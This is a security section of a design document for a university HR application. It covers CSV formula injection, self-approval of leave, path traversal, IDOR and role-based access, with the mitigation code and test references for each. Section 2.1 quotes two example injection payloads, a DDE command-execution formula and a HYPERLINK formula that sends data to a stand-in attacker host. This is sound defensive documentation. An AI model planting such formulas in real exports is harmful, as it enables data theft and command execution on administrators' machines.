## 2. Threat Vector Assessment & Applied Mitigations

### 2.1. CWE-1236: Improper Neutralization of Formula Elements in CSV Exports
- **Risk**: Spreadsheet software (Microsoft Excel, LibreOffice Calc, Google Sheets) interprets cells starting with `=`, `+`, `-`, `@`, `\t`, or `\r` as executable formula expressions. A malicious user could submit a name or leave reason such as `=cmd|"/C calc"!A0` or `=HYPERLINK("http://attacker.com/leak?data="&A2)` to exfiltrate institutional personnel data or achieve remote command execution when an administrator opens the exported directory.
- **Applied Defense**: Every cell generated by `generateEmployeeDirectoryCsv` and `generateLeaveApplicationsCsv` passes through `sanitizeCsvCell(val)`:
  ```javascript
  sanitizeCsvCell(val) {
    if (val === null || val === undefined) return '';
    let str = String(val).trim();
    if (/^[=+\-@\t\r]/.test(str)) {
      str = "'" + str; // Neutralize formula execution by forcing text interpretation
    }
    if (str.includes(',') || str.includes('"') || str.includes('\n')) {
      str = `"${str.replace(/"/g, '""')}"`;
    }
    return str;
  }
  ```
- **Automated Verification**: Verified in Test 41 of `hr_employee_management.test.js`.

### 2.2. Separation of Duties: Self-Approval of Leave Applications
- **Risk**: A privileged user (such as a Department Head or Dean) applying for personal leave and approving their own requisition without independent review.
- **Applied Defense**: Hard business logic check in `reviewLeaveApplication`:
  ```javascript
  if (application.employee.user.toString() === reviewerUserId.toString()) {
    return res.status(403).json({
      success: false,
      message: 'Separation of duties violation: You cannot approve or review your own leave application'
    });
  }
  ```
- **Automated Verification**: Verified in Test 24 of `hr_employee_management.test.js`.

### 2.3. CWE-22: Path Traversal in Document Upload & Download
- **Risk**: An attacker supplying `../../` sequences in document filenames to read or overwrite critical system files (`/etc/passwd` or `.env`).
- **Applied Defense**:
  - File upload filenames are stripped of directories via `path.basename` and special characters are replaced with underscores.
  - File downloads resolve path strictly within `HR_UPLOADS` via `path.resolve(HR_UPLOADS, path.basename(doc.fileName))` and verify file existence before streaming.
- **Automated Verification**: Verified in Tests 35 and 37 of `hr_employee_management.test.js`.

### 2.4. Insecure Direct Object References (IDOR) & Confidentiality Leaks
- **Risk**: Employees querying or modifying other employees' profiles, leave requisitions, or confidential tax/appraisal documents.
- **Applied Defense**:
  - `getMyProfile`, `getMyLeaveBalances`, `getMyLeaveApplications`, and `getMyAttendance` bind queries strictly to `req.user.userId`.
  - Non-HR personnel attempting to access other employees' profiles or documents receive `HTTP 403 Forbidden`.
  - Confidential documents (`isConfidential: true`) are filtered out from non-HR queries even if requested by other staff.
- **Automated Verification**: Verified in Tests 12, 36, and 37 of `hr_employee_management.test.js`.

### 2.5. Role-Based Access Control (RBAC): Strict Student Blocking
- **Risk**: Students attempting to probe or invoke employee management endpoints.
- **Applied Defense**:
  - Top-level route middleware in `hr.routes.js`:
    ```javascript
    router.use(authMiddleware);
    router.use(allowRoles('admin', 'hr_admin', 'hr_officer', 'department_head', 'faculty', 'employee'));
    ```
  - Any request from a user with `role: 'student'` is immediately terminated with `HTTP 403 Forbidden: Access denied for your role`.
- **Automated Verification**: Verified in Test 43 of `hr_employee_management.test.js`.
